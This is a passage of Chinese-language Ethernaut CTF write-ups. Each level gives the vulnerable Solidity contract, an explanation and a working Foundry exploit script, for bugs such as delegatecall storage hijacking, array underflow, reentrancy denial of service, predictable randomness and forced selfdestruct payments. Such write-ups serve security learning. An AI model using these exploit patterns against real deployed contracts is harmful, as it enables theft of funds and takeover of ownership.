0x1fec23bf3a1424726dD60b998B9BCf6b3B42b800;    NaughtCoin naughtCoin;    constructor(address _naughtCoin) &#123;        naughtCoin = NaughtCoin(_naughtCoin);    &#125;    function attack() external &#123;        naughtCoin.transferFrom(PLAYER, address(this), 1000000 * 1e18);    &#125;&#125;\n\n\n\nPreservation// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Preservation &#123;    // public library contracts    address public timeZone1Library;    address public timeZone2Library;    address public owner;    uint256 storedTime;    // Sets the function signature for delegatecall    bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;        timeZone1Library = _timeZone1LibraryAddress;        timeZone2Library = _timeZone2LibraryAddress;        owner = msg.sender;    &#125;    // set the time for timezone 1    function setFirstTime(uint256 _timeStamp) public &#123;        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));    &#125;    // set the time for timezone 2    function setSecondTime(uint256 _timeStamp) public &#123;        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));    &#125;&#125;// Simple library contract to set the timecontract LibraryContract &#123;    // stores a timestamp    uint256 storedTime;    function setTime(uint256 _time) public &#123;        storedTime = _time;    &#125;&#125;\n\n\n\n思路利用delegatecall合约的存储特性,第一步先改变slot中timeZone1Library的值为攻击合约地址.利用攻击合约的函数setTime(uint256)改变代理合约 Preservation的存储变量内容.\nExpcontract PreservationSolution is Script &#123;    Preservation preservation = Preservation(0x215061e387E1FF312cD943967d7c9f74FE9186F8);    function run() public &#123;        vm.startBroadcast();        PreservationAttack attack = new PreservationAttack(address(preservation));        attack.attack();        bytes32 leet0 = vm.load(address(preservation), bytes32(uint256(0)));        bytes32 leet1 = vm.load(address(preservation), bytes32(uint256(1)));        bytes32 leet2 = vm.load(address(preservation), bytes32(uint256(2)));        console.logBytes32(leet0);        console.logBytes32(leet1);        console.logBytes32(leet2);        vm.stopBroadcast();    &#125;&#125;contract PreservationAttack &#123;    address public addressOne;    address public addressTwo;    address public owner;    Preservation preservation;    constructor(address _preservationAddress) &#123;        preservation = Preservation(_preservationAddress);    &#125;    function attack() external &#123;        //第一步改变timeZone1Library为攻击合约地址        preservation.setFirstTime(uint256(uint160(address(this))));        //第二步更改OWNER为自己的合约地址        preservation.setFirstTime(uint256(uint160(address(msg.sender))));    &#125;    function setTime(uint256 _time) public &#123;        owner = address(uint160(_time));    &#125;&#125;\n\n\n\nRecovery// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Recovery &#123;    //generate tokens    function generateToken(string memory _name, uint256 _initialSupply) public &#123;        new SimpleToken(_name, msg.sender, _initialSupply);    &#125;&#125;contract SimpleToken &#123;    string public name;    mapping(address =&gt; uint256) public balances;    // constructor    constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;        name = _name;        balances[_creator] = _initialSupply;    &#125;    // collect ether in return for tokens    receive() external payable &#123;        balances[msg.sender] = msg.value * 10;    &#125;    // allow transfers of tokens    function transfer(address _to, uint256 _amount) public &#123;        require(balances[msg.sender] &gt;= _amount);        balances[msg.sender] = balances[msg.sender] - _amount;        balances[_to] = _amount;    &#125;    // clean up after ourselves    function destroy(address payable _to) public &#123;        selfdestruct(_to);    &#125;&#125;\n\n\n\n思路工厂合约创新的代币合约的时候没有记录代币合约地址，我们需要找到地址并且销毁代币合约转走余额，可以直接在Etherscan寻找，找自己钱包地址交易过的地址就行。\n还有一种从合约地址创建的规律推出来，具体可以看文章涉及RLP编码\nExpinterface IRecovery &#123;    function destroy(address payable _to) external;&#125;contract RecoverySolution is Script &#123;    function run() public &#123;        vm.startBroadcast();        SimpleTokenAttacker attacker = new SimpleTokenAttacker(0x43be930C1C0935f82e4febd2DCf35768d8B6BE03);        attacker.attack();        vm.stopBroadcast();    &#125;&#125;contract SimpleTokenAttacker &#123;    address recoveryAddress;    constructor(address _address) &#123;        recoveryAddress = _address;    &#125;    function attack() external &#123;        IRecovery(recoveryAddress).destroy(payable(msg.sender));    &#125;&#125;\n\n\n\nAlien Codex// SPDX-License-Identifier: MITpragma solidity ^0.5.0;import &quot;../helpers/Ownable-05.sol&quot;;contract AlienCodex is Ownable &#123;    bool public contact;    bytes32[] public codex;    modifier contacted() &#123;        assert(contact);        _;    &#125;    function makeContact() public &#123;        contact = true;    &#125;    function record(bytes32 _content) public contacted &#123;        codex.push(_content);    &#125;    function retract() public contacted &#123;        codex.length--;    &#125;    function revise(uint256 i, bytes32 _content) public contacted &#123;        codex[i] = _content;    &#125;&#125;\n\n\n\n思路因为版本较低，所以说都会出现OvewFlow或者UnderFlow的情况，首先先绕过contacted()呼叫函数makeContact。再使用函数retract()造成UnderFlow的情况。至于如何获得拥有权，合约没有Owner啊?合约继承了Ownable合约如果有继承合约，则被继承合约的 storage variable 会存储在原合约之前，也就是 _owner 变量将存储在 slot 0，接着才按顺序存储 contact、codex。\n下面是最重要的一步，因为codex动态数组出现了UnderFlow所以,数组的长度是2**256,覆盖了整个空间.现在就是通过修改codex[i]来修改slot0的值,具体的推理看下图.\n\nExp必须在unchecked条件下,因为版本高的Solidity会自动防止出现溢出的情况\ninterface IAlienCodex &#123;    function makeContact() external;    function record(bytes32 _content) external;    function retract() external;    function revise(uint256 i, bytes32 _content) external;&#125;contract AlienCodexSolution is Script &#123;    function run() public &#123;        vm.startBroadcast();        AlienAttack attackContract = new AlienAttack(0x96D3dbD3634425BaD084a02fA77eFf21a1Cac4F5);        attackContract.attack();        bytes32 leet0 = vm.load(address(attackContract.alienCodex()), bytes32(uint256(0)));        console.logBytes32(leet0);        vm.stopBroadcast();    &#125;&#125;contract AlienAttack &#123;    IAlienCodex public alienCodex;    constructor(address _alienCodexAddress) &#123;        alienCodex = IAlienCodex(_alienCodexAddress);    &#125;    function attack() external &#123;        alienCodex.makeContact();        alienCodex.retract();        unchecked &#123;            uint256 i = uint256(2) ** uint256(256) - uint256(keccak256(abi.encode(uint256(1))));            alienCodex.revise(i, bytes32(uint256(uint160(msg.sender))));        &#125;    &#125;&#125;\n\n\n\nDenial// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Denial &#123;    address public partner; // withdrawal partner - pay the gas, split the withdraw    address public constant owner = address(0xA9E);    uint256 timeLastWithdrawn;    mapping(address =&gt; uint256) withdrawPartnerBalances; // keep track of partners balances    function setWithdrawPartner(address _partner) public &#123;        partner = _partner;    &#125;    // withdraw 1% to recipient and 1% to owner    function withdraw() public &#123;        uint256 amountToSend = address(this).balance / 100;        // perform a call without checking return        // The recipient can revert, the owner will still get their share        partner.call&#123;value: amountToSend&#125;(&quot;&quot;);        payable(owner).transfer(amountToSend);        // keep track of last withdrawal time        timeLastWithdrawn = block.timestamp;        withdrawPartnerBalances[partner] += amountToSend;    &#125;    // allow deposit of funds    receive() external payable &#123;&#125;    // convenience function    function contractBalance() public view returns (uint256) &#123;        return address(this).balance;    &#125;&#125;\n\n\n\n思路就是简单的Re-entracy造成DOS的漏洞利用。\nExpinterface Idenial {    function withdraw() external;    function setWithdrawPartner(address _partner) external;    function contractBalance() external view returns (uint256);}\ncontract DenialSolution is Script {    function run() public {        vm.startBroadcast();        DenialAttack attackContract &#x3D; new DenialAttack(0x20a7E19aF42B2AAA1Ee5d429B10ABc8c3bcd5746);        attackContract.attack();        vm.stopBroadcast();    }}\ncontract DenialAttack {    Idenial public denial;\nconstructor(address _denialAddress0) {\n    denial = Idenial(_denialAddress0);\n}\n\nfunction attack() external {\n    denial.setWithdrawPartner(address(this));\n}\n\nreceive() external payable {\n    denial.withdraw();\n}\n\n}\n","categories":["CTF-Ethernaut Writeups"],"tags":["Web3 Security","Ethernaut"]},{"title":"Ethernaut 11-15","url":"/2026/01/29/ethernautP2/","content":"资料库\n解构Solidity Contract\n\n合约升级,TPP、UUPS\n\nAlchemy关于Web3的基础\n\nWhat is Smart Contract Storage Layout?\n\n关于Solidity类型转换\n\nETH开发文档\n\n\nElevator// SPDX-License-Identifier: MITpragma solidity ^0.8.0;interface Building &#123;    function isLastFloor(uint256) external returns (bool);&#125;contract Elevator &#123;    bool public top;    uint256 public floor;    function goTo(uint256 _floor) public &#123;        Building building = Building(msg.sender);        if (!building.isLastFloor(_floor)) &#123;            floor = _floor;            top = building.isLastFloor(floor);        &#125;    &#125;&#125;\n\n\n\n思路通关条件是让top为真.\n这一道题目是关于External Call 的安全性，题目对于接口函数building.isLastFloor(uint256)的使用是没有检查的.\n根据代码的理解就是让接口函数第一次返回false第二次返回true.\nExpinterface IBuilding &#123;    function goTo(uint256) external returns (bool);&#125;contract ElevatorSolution is Script &#123;    Elevator elevator = Elevator(InstanceAddress);    function run() public &#123;        vm.startBroadcast();        ElevatorAttack elevatorAttack = new ElevatorAttack(address(elevator));        elevatorAttack.attack();        console.log(&quot;bool top&quot;, elevator.top());        vm.stopBroadcast();    &#125;&#125;contract ElevatorAttack &#123;    Elevator private immutable i_elevator;    uint8 counter = 1;    constructor(address _instanceAddress) public &#123;        i_elevator = Elevator(_instanceAddress);    &#125;    function isLastFloor(uint256 _floor) external returns (bool) &#123;        if (counter &lt; 2) &#123;            counter++;            return false;        &#125; else &#123;            return true;        &#125;    &#125;    function attack() external &#123;        i_elevator.goTo(1);    &#125;&#125;\n\n\n\n\n\nPrivacy// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Privacy &#123;    bool public locked = true;    uint256 public ID = block.timestamp;    uint8 private flattening = 10;    uint8 private denomination = 255;    uint16 private awkwardness = uint16(block.timestamp);    bytes32[3] private data;    constructor(bytes32[3] memory _data) &#123;        data = _data;    &#125;    function unlock(bytes16 _key) public &#123;        require(_key == bytes16(data[2]));        locked = false;    &#125;    /*    A bunch of super advanced solidity algorithms...      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\\      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU    */&#125;\n\n\n\n思路通关要求locked为False\n考察对于Layout of State Variables in Storage，先计算目标key在哪个slot接着就是提取内容，再call函数调用。\nExp\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;forge-std/Script.sol&quot;;import &quot;../src/Privacy.sol&quot;;/** * //  bool：1 byte * // address：20 bytes * // uint256 / int256：32 bytes * // uint8 / int8：1 byte (后缀数字除以 8 依此类推) * // 固定大小的 bytes1 / bytes2 / … / bytes32：大小等同后缀數字 * // 固定陣列 bytes32[3]：每個元素皆 bytes32 (取決数组的元素长度) */contract PrivacySolution is Script &#123;    function run() public &#123;        Privacy privacy = Privacy(InstanceAddress);        vm.startBroadcast();        bytes32 key = vm.load(address(privacy), bytes32(uint256(5)));        console.log(&quot;key&quot;, uint256(key));        address(privacy).call(abi.encodeWithSignature(&quot;unlock(bytes16)&quot;, bytes16(key)));        vm.stopBroadcast();    &#125;&#125;\n\n\n\nGatekeeperOne// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperOne &#123;    address public entrant;    modifier gateOne() &#123;        require(msg.sender != tx.origin);        _;    &#125;    modifier gateTwo() &#123;        require(gasleft() % 8191 == 0);        _;    &#125;    modifier gateThree(bytes8 _gateKey) &#123;        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);        require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);        _;    &#125;    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;        entrant = tx.origin;        return true;    &#125;&#125;\n\n\n\n思路在了解了一定的solidity类型转换的原理后，gateone通过条件很简单只要用合约呼叫就可以通过,gatetwo中存在全局变量gasleft()表示交易中剩余的Gas费用.\n对于gasleft() % 8191 == 0条件只需要在使用call方式触发函数的时候设定确定的Gas接着Fuzz出正确的情况\n具体如下利用For循环\nfor (uint256 i = 0; i &lt; 8191; i++) &#123;            (bool success,) =                address(gatekeeperOne).call&#123;gas: i + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, key));            if (success) &#123;                break;            &#125;        &#125;\n\n对于gateThree需要满足以下三个条件\nrequire(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);\n\n\n观察第一个条件和第三个条件其实是大同小异的都是后面两个Byte跟uint32(uint64(_gateKey)相同，前面的bytes不需要管，因为存在类型转换的填充技术，会用00补上。\n第二个条件就是需要满足uint32(uint64(_gateKey)从右往左数第三第四个Byte不与uint64(_gateKey)相同,所以这里使用AND运算\n0 AND 0   // 00 AND 1   // 01 AND 0   // 01 AND 1   // 1bytes8(uint64(uint160(tx.origin))) &amp; 0xFFFFFFFF0000FFFF\n\n\n\nExpcontract GatekeeperOneSolution is Script &#123;    GatekeeperOne gatekeeperOne = GatekeeperOne(0x69e4C5489391A439f0C690d9328070eD91680C28);    function run() public &#123;        vm.startBroadcast();        GatekeeperOneAttack attack = new GatekeeperOneAttack(gatekeeperOne);        attack.attack();        vm.stopBroadcast();    &#125;&#125;contract GatekeeperOneAttack &#123;    GatekeeperOne gatekeeperOne;    constructor(GatekeeperOne _gatekeeperOne) &#123;        gatekeeperOne = _gatekeeperOne;    &#125;    function attack() external &#123;        bytes8 key = bytes8(uint64(uint160(tx.origin))) &amp; 0xFFFFFFFF0000FFFF;        for (uint256 i = 0; i &lt; 8191; i++) &#123;            (bool success,) =                address(gatekeeperOne).call&#123;gas: i + 8191 * 3&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, key));            if (success) &#123;                break;            &#125;        &#125;    &#125;&#125;\n\n\n\nGatekeeperTwo// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract GatekeeperTwo &#123;    address public entrant;    modifier gateOne() &#123;        require(msg.sender != tx.origin);        _;    &#125;    modifier gateTwo() &#123;        uint256 x;        assembly &#123;            x := extcodesize(caller())        &#125;        require(x == 0);        _;    &#125;    modifier gateThree(bytes8 _gateKey) &#123;        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);        _;    &#125;    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;        entrant = tx.origin;        return true;    &#125;&#125;\n\n思路gateTwo():一个内联汇编块由 assembly { ... } 标记的，其中大括号内的代码是 Yul 语言中的代码。其中extcodesize(caller())表示的是获取调用当前函数者（caller）相当于msg.sender地址上的代码大小（字节数）。在以太坊中，一个合约的“代码”只有在构造函数（Constructor）完全执行结束之后，才会真正存储到区块链上。\n核心机制：Init Code vs Runtime Code在 EVM 层面，智能合约的代码分为两部分：\n\n初始化代码 (Creation Code &#x2F; Init Code)：\n这是包含 constructor 逻辑的代码。\n它的作用是生成并返回最终要存储在链上的代码。\n重点：当你在部署合约时，EVM 正在执行这部分代码。\n\n\n运行时代码 (Runtime Code)：\n这是合约部署完成后，永久存储在区块链地址上的代码（也就是业务逻辑）。\nextcodesize 统计的就是这部分代码的大小。\n\n\n\n所以说只需要在合约构造函数中实现攻击，就可以绕过检测\nassembly &#123;            x := extcodesize(caller())        &#125;\n\n\n\ngateThree()：已知等式a ^ b = c可以得到a ^ c = b，所以\nbytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);\n\n\n\nExp// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;forge-std/Script.sol&quot;;import &quot;../src/GatekeeperTwo.sol&quot;;contract GatekeeperTwoSolution is Script &#123;    GatekeeperTwo gatekeeperTwo = GatekeeperTwo(0x6abe30b40bFbC5377EbF15eC708c4Fa25B31d0b4);    function run() public &#123;        vm.startBroadcast();        GatekeeperTwoAttack attack = new GatekeeperTwoAttack(gatekeeperTwo);        vm.stopBroadcast();    &#125;&#125;contract GatekeeperTwoAttack &#123;    GatekeeperTwo gatekeeperTwo;    //require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);    //uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max ==  uint64(_gateKey)    constructor(GatekeeperTwo _gatekeeperTwo) &#123;        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);        gatekeeperTwo = _gatekeeperTwo;        address(gatekeeperTwo).call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, _gateKey));    &#125;&#125;\nNaught Coincontract NaughtCoin is ERC20 &#123;    // string public constant name = &#x27;NaughtCoin&#x27;;    // string public constant symbol = &#x27;0x0&#x27;;    // uint public constant decimals = 18;    uint256 public timeLock = block.timestamp + 10 * 365 days;    uint256 public INITIAL_SUPPLY;    address public player;    constructor(address _player) ERC20(&quot;NaughtCoin&quot;, &quot;0x0&quot;) &#123;        player = _player;        INITIAL_SUPPLY = 1000000 * (10 ** uint256(decimals()));        // _totalSupply = INITIAL_SUPPLY;        // _balances[player] = INITIAL_SUPPLY;        _mint(player, INITIAL_SUPPLY);        emit Transfer(address(0), player, INITIAL_SUPPLY);    &#125;    function transfer(address _to, uint256 _value) public override lockTokens returns (bool) &#123;        super.transfer(_to, _value);    &#125;    // Prevent the initial owner from transferring tokens until the timelock has passed    modifier lockTokens() &#123;        if (msg.sender == player) &#123;            require(block.timestamp &gt; timeLock);            _;        &#125; else &#123;            _;        &#125;    &#125;&#125;\n\n\n\n思路在ERC20标准中存在两个转钱的方法，分别是transfer和transferFrom\nfunction transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) &#123;      address spender = _msgSender();      _spendAllowance(from, spender, amount);      _transfer(from, to, amount);      return true;  &#125;\n\n在是使用transferFrom要先使用approve方法，简单来说就是代币拥有者允许某个地址的交易代币的数量。\t\nExpcontract NaughtCoinSolution is Script &#123;    NaughtCoin naughtCoin = NaughtCoin(0xC0Faf18D2b14706353A4a62D752b1Ca4bbe63b5c);    function run() public &#123;        vm.startBroadcast();        NaughtCoinAttack attack = new NaughtCoinAttack(address(naughtCoin));        ERC20(address(naughtCoin)).approve(address(attack), 1000000 * 1e18);        attack.attack();        vm.stopBroadcast();    &#125;&#125;contract NaughtCoinAttack &#123;    address public constant PLAYER = 0x1fec23bf3a1424726dD60b998B9BCf6b3B42b800;    NaughtCoin naughtCoin;    constructor(address _naughtCoin) &#123;        naughtCoin = NaughtCoin(_naughtCoin);    &#125;    function attack() external &#123;        naughtCoin.transferFrom(PLAYER, address(this), 1000000 * 1e18);    &#125;&#125;\n","categories":["CTF-Ethernaut Writeups"],"tags":["Web3 Security","Ethernaut"]},{"title":"Ethernaut 1-10","url":"/2026/01/27/ethernautP1/","content":"资料库\n解构Solidity Contract\n\n合约升级,TPP、UUPS\n\nAlchemy关于Web3的基础\n\nWhat is Smart Contract Storage Layout?\n\n关于Solidity类型转换\n\nETH开发文档\n\n\nFallBack// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123;    mapping(address =&gt; uint256) public contributions;    address public owner;    constructor() &#123;        owner = msg.sender;        contributions[msg.sender] = 1000 * (1 ether);    &#125;    modifier onlyOwner() &#123;        require(msg.sender == owner, &quot;caller is not the owner&quot;);        _;    &#125;    function contribute() public payable &#123;        require(msg.value &lt; 0.001 ether);        contributions[msg.sender] += msg.value;        if (contributions[msg.sender] &gt; contributions[owner]) &#123;            owner = msg.sender;        &#125;    &#125;    function getContribution() public view returns (uint256) &#123;        return contributions[msg.sender];    &#125;    function withdraw() public onlyOwner &#123;        payable(owner).transfer(address(this).balance);    &#125;    receive() external payable &#123;        require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);        owner = msg.sender;    &#125;&#125;\n\n\n\n思路\nreceive()和fallback()区别\n\nreceive()\n专门用于接收 ETH 转账\n必须是 external payable\n仅在 msg.data 为空时触发\n\n\nfallback()\n用于处理不存在的函数调用，或者带数据的 ETH 转账\n可以是 payable 或非 payable\n在代理合约中，经常用来转发调用\n\n\n\n\nmsg.data是什么东西\n\n\n\n根据题目第一步需要获得合约的所有权，第二步提款到自己的账号。\n第一步function contribute()和receive(),但是对于条件来说，receive()更加容易实现，只需要转账有余额，并且有contributions映射就可以实现owner = msg.sender;。第二步通过withdraw提款\nExp：contract Ethernaut01Script is Script &#123;    Instance public ethernaut01 = Instance(InstanceAddress);\tfunction run() public &#123;        vm.startBroadcast();        challange.contribute&#123;value: 1 wei&#125;();        //触发Receive()        (bool success,) = payable(challange).call&#123;value: 1 wei&#125;(&quot;&quot;);        require(success, &quot;Transfer failed.&quot;);        challange.withdraw();        vm.stopBroadcast();    &#125;&#125;\n\n\n\n\n\nFallOut// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &quot;openzeppelin-contracts-06/math/SafeMath.sol&quot;;contract Fallout &#123;    using SafeMath for uint256;    mapping(address =&gt; uint256) allocations;    address payable public owner;    /* constructor */    function Fal1out() public payable &#123;        owner = msg.sender;        allocations[owner] = msg.value;    &#125;    modifier onlyOwner() &#123;        require(msg.sender == owner, &quot;caller is not the owner&quot;);        _;    &#125;    function allocate() public payable &#123;        allocations[msg.sender] = allocations[msg.sender].add(msg.value);    &#125;    function sendAllocation(address payable allocator) public &#123;        require(allocations[allocator] &gt; 0);        allocator.transfer(allocations[allocator]);    &#125;    function collectAllocations() public onlyOwner &#123;        msg.sender.transfer(address(this).balance);    &#125;    function allocatorBalance(address allocator) public view returns (uint256) &#123;        return allocations[allocator];    &#125;&#125;\n\n\n\n思路目标是获取合约的使用权，在Solidity的0.6版本，构造函数是必须要和合约同名的。但是我们发现合约的构造函数并不是真的，Fal1out其中有一个是数字1而不是字母l，因此我们可以创建接口直接调用Fal1out函数。\nExpFallout public challange = Fallout(InstancetAddress);  function run() public &#123;      vm.startBroadcast();      challange.Fal1out();      vm.stopBroadcast();  &#125;\n\n\n\n\nCoin Filp// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract CoinFlip &#123;    uint256 public consecutiveWins;    uint256 lastHash;    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor() &#123;        consecutiveWins = 0;    &#125;    function flip(bool _guess) public returns (bool) &#123;        uint256 blockValue = uint256(blockhash(block.number - 1));        if (lastHash == blockValue) &#123;            revert();        &#125;        lastHash = blockValue;        uint256 coinFlip = blockValue / FACTOR;        bool side = coinFlip == 1 ? true : false;        if (side == _guess) &#123;            consecutiveWins++;            return true;        &#125; else &#123;            consecutiveWins = 0;            return false;        &#125;    &#125;&#125;\n\n\n\n思路因为在WEB3中没有真正的随机数，通过代码实现的都可以仿造，在这个例子中只需要仿照合约中的思路得到答案，再把答案给题目合约就可以了\nExp执行十次合约（没错很蠢，也很浪费钱，每次都要广播）每次执行一次都要等一段时间，跳过blockNumber\n\n[!TIP]\n有个更好的方法是直接创建一个Attrack合约在链上，调用攻击方法就可以了\n\nAttract.sol\n// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &#123;Script, console&#125; from &quot;forge-std/Script.sol&quot;;import &#123;CoinFlip&#125; from &quot;../src/Ethernaut04.sol&quot;;contract Attrack &#123;    CoinFlip private immutable i_coinFilp;    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;    constructor(address _CoinFlip) &#123;        i_coinFilp = CoinFlip(_CoinFlip);    &#125;    function Flip() external &#123;        bool guess = FindGuess();        i_coinFilp.flip(guess);    &#125;    function FindGuess() private view returns (bool) &#123;        uint256 blockValue = uint256(blockhash(block.number - 1));        uint256 coinFlip = blockValue / FACTOR;        bool side = coinFlip == 1 ? true : false;        return side;    &#125;&#125;contract CoinFlipSolution is Script &#123;    CoinFlip public coinflipInstance = CoinFlip(InstanceAddress);    function run() external &#123;        vm.startBroadcast();        Attrack attrack = new Attrack(0x585261CB71C102d4a0AD55AEB0cf71A8235A32f4);        attrack.Flip();        console.log(&quot;consecutiveWins: &quot;, coinflipInstance.consecutiveWins());        vm.stopBroadcast();    &#125;&#125;\n\n\n\n\n\n\n\n\n\nTelephone// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Telephone &#123;    address public owner;    constructor() &#123;        owner = msg.sender;    &#125;    function changeOwner(address _owner) public &#123;        if (tx.origin != msg.sender) &#123;            owner = _owner;        &#125;    &#125;&#125;\n\n\n\n思路关键点是在于区别tx.origin和msg.sender的区别，前者是交易的发起者，后者是合约的调用者\n\n [!NOTE]\nmsg.sender的所有者可以是一个合同。\ntx.origin的所有者永远不会是一个合同。\n在一个简单的调用链A-B-C-D中，D内部的msg.sender将是C，tx.origin将是A。\n\n\n\nExp要注意的一点是要合约Owner是钱包地址才行，函数changeOwner的传入参数是要钱包地址。\ncontract TelephoneSolution is Script &#123;    Telephone public challange = Telephone(InstanceAddress);    function run() external &#123;        console.log(&quot;caller : &quot;, msg.sender);        console.log(&quot;oldOwner&quot;, challange.owner());        vm.startBroadcast();        new TelephoneAttack(challange, vm.envAddress(&quot;MY_ADDRESS&quot;));        vm.stopBroadcast();        console.log(&quot;newOwner&quot;, challange.owner());    &#125;&#125;contract TelephoneAttack &#123;    constructor(Telephone _challengeInstance, address _newOwner) &#123;        _challengeInstance.changeOwner(_newOwner);    &#125;&#125;\n\n\n\n\n\n\n\nToken// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token &#123;    mapping(address =&gt; uint256) balances;    uint256 public totalSupply;    constructor(uint256 _initialSupply) public &#123;        balances[msg.sender] = totalSupply = _initialSupply;    &#125;    function transfer(address _to, uint256 _value) public returns (bool) &#123;        require(balances[msg.sender] - _value &gt;= 0);        balances[msg.sender] -= _value;        balances[_to] += _value;        return true;    &#125;    function balanceOf(address _owner) public view returns (uint256 balance) &#123;        return balances[_owner];    &#125;&#125;\n\n思路在合约0.6版本，不存在safeMath，可以在加减乘除进行整数的溢出， require(balances[msg.sender] - _value &gt;= 0);其中当msg.sender是零的时候就可以造成整数向下溢出。只需要msg.sender等于0，_to参数是钱包的地址，就可以增加余额。\nExpcontract TokenSolution is Script &#123;    Token public tokenInstance = Token(InstanceAddress);    function run() external &#123;        vm.startBroadcast();        tokenInstance.transfer(address(1), 21);        console.log(&quot;My balance: &quot;, tokenInstance.balanceOf(vm.envAddress(&quot;MY_ADDRESS&quot;)));        vm.stopBroadcast();    &#125;&#125;\n\n直接构造函数填入实例地址即可。\n\n\n[!NOTE]\n首先钱包地址调用了Attrack合约地址中的构造函数，构造函数调用接口就是实例地址。所以对于接口来说msg.sender就是Attrcak合约的地址。Attrack合约是没有余额的，而对于Attrack合约来说，msg.sender是钱包地址。一定要注意好不同的msg.sender的变化。\n\nDelegation// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Delegate &#123;    address public owner;    constructor(address _owner) &#123;        owner = _owner;    &#125;    function pwn() public &#123;        owner = msg.sender;    &#125;&#125;contract Delegation &#123;    address public owner;    Delegate delegate;    constructor(address _delegateAddress) &#123;        delegate = Delegate(_delegateAddress);        owner = msg.sender;    &#125;    fallback() external &#123;        (bool result,) = address(delegate).delegatecall(msg.data);        if (result) &#123;            this;        &#125;    &#125;&#125;\n\n思路首先了解delegatecall函数的特性，使用delegatecall函数还需要注意delegatecall()对状态变量存储的影响，也就是说如果用户A要求更改合约C的某个状态存储变量，合约C不会改变，反而是合约B的对应名字的状态存储变量会发生改变。&#x3D;&#x3D;合约C只是提供行为逻辑，合约B提供逻辑需要的变量&#x3D;&#x3D;\n\n\nExp触发Fallback函数的delegatecall方法\ncontract DelegationSolution is Script &#123;    Delegation delegation = Delegation(InstanceAddress);    function run() external &#123;        bytes memory datas = abi.encodeWithSignature(&quot;pwn()&quot;);        vm.startBroadcast();        console.log(&quot;Owner before: &quot;, delegation.owner());        address(delegation).call(datas);        console.log(&quot;newOwner&quot;, delegation.owner());        vm.stopBroadcast();    &#125;&#125;\n\n\n\n\n\nForce思路利用自毁函数强行转移合约的余额，强制交易余额\n\nExpcontract ForceSolution is Script &#123;    //1.创建一个有钱的合约    //2.销毁第一步创建的合约，强制转账到目标合约    function run() external &#123;        vm.startBroadcast();        new ForceAttack&#123;value: 1 wei&#125;();        vm.stopBroadcast();    &#125;&#125;contract ForceAttack &#123;    constructor() payable &#123;        selfdestruct(payable(InstanceAddress));    &#125;&#125;\n\n\n\n\n\nVault// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Vault &#123;    bool public locked;    bytes32 private password;    constructor(bytes32 _password) &#123;        locked = true;        password = _password;    &#125;    function unlock(bytes32 _password) public &#123;        if (password == _password) &#123;            locked = false;        &#125;    